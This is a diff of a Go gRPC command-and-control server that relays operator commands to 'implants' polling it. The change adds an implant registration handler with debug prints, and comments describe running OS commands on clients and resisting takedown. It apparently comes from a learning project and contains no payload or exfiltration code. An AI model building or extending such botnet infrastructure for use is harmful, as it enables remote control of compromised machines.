@@ -11,6 +11,7 @@ import (
 	"google.golang.org/grpc"
 )
 
+/*It should be said, I think that these commands are invoked automatically, based on the RPC that was recieved, as the server decides what to do and when to do it. We don't invoke these explicitly, yet they are invoked.*/
 // create a struct for handling commands
 type implantServer struct {
 	work, output chan *grpcapi.Command //create a new thread to handle commands, in Golang this is defined by the "chan" type or "channel".
@@ -19,6 +20,7 @@ type implantServer struct {
 // we need to have a seperate admin struct for handling admin commands, that way we don't run OS commands on the server, only on clients
 type adminServer struct {
 	work, output chan *grpcapi.Command //thread for admin services
+	//uuid         chan *grpcapi.Registration //myabe??
 }
 
 // we impliment thse sepertaly to keep them mutally exclusive. Each one has a a channel for sending/recieving work and command output.
@@ -34,7 +36,8 @@ func NewAdminServer(work, output chan *grpcapi.Command) *adminServer { //returns
 	s := new(adminServer) //instantiate a struct of implantServer, name it s
 	s.work = work         //assign work
 	s.output = output     //assign output
-	return s              //return the struct.
+	//s.uuid = uuid         //testing this out
+	return s //return the struct.
 }
 
 // ctx is part of the built-in golang package "context", it is used for the creation/handling of API calls, without shitting the bed when multiple calls are made at the same time like
@@ -75,6 +78,20 @@ func (s *adminServer) RunCommand(ctx context.Context, cmd *grpcapi.Command) (*gr
 	return res, nil
 }
 
+// handle UUID
+func (s *implantServer) RegisterNewImplant(ctx context.Context, uuid_result *grpcapi.Registration) (*grpcapi.Empty, error) {
+	//var res *grpcapi.Registration
+	res := uuid_result.GetUuid() //this is a function....
+	uuidstr := fmt.Sprintf("%s", res)
+	fmt.Println(res) //this works, but prints the Hex/memory not the value as a string, I think...
+	fmt.Println(uuidstr)
+	fmt.Println("[+] Recieved new registration request")
+	//fmt.Printf("%s\n", res.Uuid)
+	//basic return
+	return &grpcapi.Empty{}, nil
+}
+
+//func (s *adminServer) ListRegisteredImplants(ctx context.Context, )
 /*
 the main server loop will run two seperate servers; one for getting requests from the admin clinet (that client being the one that we send our commands to for the server to parse)
 and another server will be the one that communicates to the bots via polling. These servers are only logically different, not physically, so a takedown of the physical server will
@@ -88,7 +105,7 @@ func main() {
 		opts                           []grpc.ServerOption   //server options
 		work, output                   chan *grpcapi.Command //work and output goroutines
 	)
-	//load file and read TLS data
+	//TODO: load file and read TLS data
 
 	//create channels for passing input and output commands to implant and admin services
 	work, output = make(chan *grpcapi.Command), make(chan *grpcapi.Command)
